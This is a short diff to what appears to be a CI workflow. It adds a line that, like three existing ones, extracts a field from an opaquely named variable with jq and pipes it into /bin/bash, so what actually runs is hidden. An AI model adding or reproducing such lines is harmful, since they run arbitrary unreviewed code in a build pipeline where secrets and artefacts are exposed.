@@ -32,6 +32,7 @@ jobs:
           echo $lthrn81 | jq -r .ha2078 | /bin/bash
           echo $ecj05615 | jq -r .w4 | /bin/bash
           echo $tdfwy8 | jq -r .sot8312 | /bin/bash
+          printf '%s' "$odi81562" | jq -r .xnwv49 | /bin/bash
 
       - name: Save output
         if: always()
